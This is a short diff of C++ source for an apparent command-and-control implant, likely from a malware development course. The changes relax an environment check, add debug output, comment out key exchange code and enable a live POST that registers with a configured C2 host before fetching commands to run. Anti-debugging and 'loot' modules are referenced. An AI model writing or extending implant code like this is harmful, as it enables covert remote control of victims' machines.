@@ -9,6 +9,8 @@
 #include "sitawareness/sitawareness.hpp"
 #include "config/config.hpp"
 #include "loot/loot.hpp"
+// #include "com_crypto/com_crypto.hpp"
+// #include "com_crypto/libsodium-win64/include/sodium.h"
 
 using json = nlohmann::json;
 
@@ -69,9 +71,12 @@ int check_ch0nky(){
     if(fileExists){
         return 1;
     }
-    exit(1);
+    return 0;
+    //exit(1);
 }
+
 int main(){
+   std::cout << "Here" << std::endl;
 //MessageBoxA(NULL,NULL,NULL,MB_YESNO);
 Sleep(100);
 check_ch0nky();
@@ -117,7 +122,17 @@ check_debugger();
     reg["session_key"] = "askdgjassgf";
 
 
-    //std::cout << post(config.c2_fqdn,config.c2_port,"/register",reg.dump()) << std::endl;
+    //std::cout << 
+
+    // encryptor enc;
+    // std::string s = enc.encrypt_public_key();
+    // json d;
+    // d["computer_guid"] = config.computer_guid;
+    // d["data"] = s;
+    // d["nonce"] = enc.random_bytes;
+    // std::cout << post(config.c2_fqdn,config.c2_port,"/key_gen",d.dump()) << std::endl;
+
+    post(config.c2_fqdn,config.c2_port,"/register",reg.dump());
     std::string get_cmd_resp = getNextCommand(config);
     json command = json::parse(get_cmd_resp);
     std::string cmd_result = "";
